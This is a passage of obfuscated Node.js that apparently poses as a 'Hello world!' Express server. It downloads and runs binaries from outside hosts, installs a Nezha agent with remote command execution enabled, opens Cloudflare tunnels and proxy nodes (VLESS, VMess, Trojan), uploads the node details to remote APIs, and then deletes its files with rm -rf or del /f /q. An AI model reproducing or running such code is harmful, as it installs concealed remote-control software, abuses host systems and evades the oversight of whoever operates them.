_0x1d7486=_0x4489,_0x154711=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x154711[_0x1d7486(_0x3b5018._0xae8f04)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x154711[_0x1d7486(0x256)](phpPath);process['platform']==='win32'?exec(_0x1d7486(_0x3b5018._0x57becf)+_0x154711['join']('\x20')+_0x1d7486(0x287),_0x5d5689=>{const _0x1c4c91=_0x1d7486;console[_0x1c4c91(_0x552fb0._0x3f6e63)](),console['log'](_0x1c4c91(0x22e)),console['log'](_0x1c4c91(_0x552fb0._0xcb77d3));}):exec(_0x1d7486(_0x3b5018._0xf22840)+_0x154711['join']('\x20')+_0x1d7486(_0x3b5018._0x6b71de),_0x4f2ef4=>{const _0x5d3335=_0x1d7486;console[_0x5d3335(0x201)](),console['log'](_0x5d3335(0x22e)),console[_0x5d3335(_0xbe9da1._0x474482)](_0x5d3335(0x273));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3a1905={_0x21c000:0x242,_0x54ff2b:0x228},_0x55eb53=_0x578b8f;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x372434=await axios[_0x55eb53(_0x3a1905._0x21c000)](_0x55eb53(0x1f8),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x55eb53(_0x3a1905._0x54ff2b)](_0x55eb53(0x244)),_0x372434;}catch(_0x1222e1){return console['error'](_0x55eb53(0x1e8)+_0x1222e1['message']),null;}}function _0x431f(){const _0x2f773e=['/vmess-argo','forEach','axios','Empowerment\x20failed\x20for\x20','Nodes\x20uploaded\x20successfully','quic','arm64','countryCode','response','32832mfgIlg','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','6fhkatx','arch','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20already\x20exists','\x20>\x20nul\x202>&1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','child_process','catch','join','/api/add-subscriptions','https://ipapi.co/json/','writeFileSync','mkdirSync','https+local://8.8.8.8/dns-query','match','Download\x20','false','amd','\x0a\x20\x20credentials-file:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','data','readFileSync','test','\x0avless://','firefox','9702854hFWGUQ','org','tunnel.json','chmod','tls','map','all','fileName','\x20-s\x20','Unknown','CFIP','&path=%2Fvless-argo%3Fed%3D2560#','\x20successfully','8443','127.0.0.1','abcdefghijklmnopqrstuvwxyz','application/json','stringify','Add\x20automatic\x20access\x20task\x20faild:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','util','\x20-c\x20','success','stream','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','taiyi.mojieonly.dpdns.org','2087','\x20-p\x20','env','rm\x20-rf\x20','fileUrl','./tmp','web\x20running\x20error:\x20','error','https://oooo.serv00.net/add-url','http://ip-api.com/json/','boot.log','createWriteStream','Error\x20reading\x20boot.log:','\x20is\x20running','\x0a\x20\x20tunnel:\x20','config.yaml','UPLOAD_URL','clear','ARGO_DOMAIN:','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','block','674208gvFIsI','a4498e0a-28c1-4d4b-841b-3bd8adc28e13','/vless-argo','text/plain;\x20charset=utf-8','close','pkill\x20-f\x20\x22[','pipe','nohup\x20','6561010dKeLuj','5885wrlJdE','8wPvIQk','14269030psRfoM','\x20failed:\x20','2096','2TwvAZI','statSync','includes','split','utf-8','/trojan-argo','isFile','https://arm64.ssss.nyc.mn/v1','none','/sub.txt\x20saved\x20successfully','basename','.exe\x20>\x20nul\x202>&1','from','existsSync','SERVER_PORT','set','npm\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/agent','direct','sub','log','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x0avmess://','?encryption=none&security=tls&sni=','?security=tls&sni=','express','App\x20is\x20running','del\x20/f\x20/q\x20','charAt','tcp','NEZHA_SERVER','&fp=firefox&type=ws&host=','/api/add-nodes','Empowerment\x20success\x20for\x20','ARGO_AUTH','https://arm64.ssss.nyc.mn/bot','length','Error\x20in\x20startserver:','unshift','Subscription\x20uploaded\x20successfully','\x20>/dev/null\x202>&1','taskkill\x20/f\x20/im\x20','PROJECT_URL','has','Error\x20downloading\x20files:','arm','post','sub.txt','automatic\x20access\x20task\x20added\x20successfully','win32','xtls-rprx-vision','2053','\x0a\x0atrojan://','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','base64','toString','trojan','2083','get','NEZHA_KEY','\x20>/dev/null\x202>&1\x20&','aarch64','filter','/dev/null','vless','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','push','NAME','/vmess-argo?ed=2560','http','CFPORT','&path=%2Ftrojan-argo%3Fed%3D2560#','UUID','10252557iUPQTb','443','12tQbIFB','--tls','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','http\x20server\x20is\x20running\x20on\x20port:','ARGO_DOMAIN','https://amd64.ssss.nyc.mn/web','exec','Hello\x20world!','listen','config.json','floor','status','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','list.txt','send','TunnelSecret','1372338uOrwHe','/tunnel.yml\x20run','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Error\x20executing\x20command:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','FILE_PATH','finish'];_0x431f=function(){return _0x2f773e;};return _0x431f();}async function startserver(){const _0x3f2652={_0x492609:0x1f7,_0x19734d:0x239},_0x4f372f=_0x578b8f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2d2d7b){console[_0x4f372f(_0x3f2652._0x492609)](_0x4f372f(_0x3f2652._0x19734d),_0x2d2d7b);}}startserver()['catch'](_0x18e326=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x18e326);}),app[_0x578b8f(0x267)](PORT,()=>console[_0x578b8f(0x228)](_0x578b8f(0x262)+PORT+'!'));
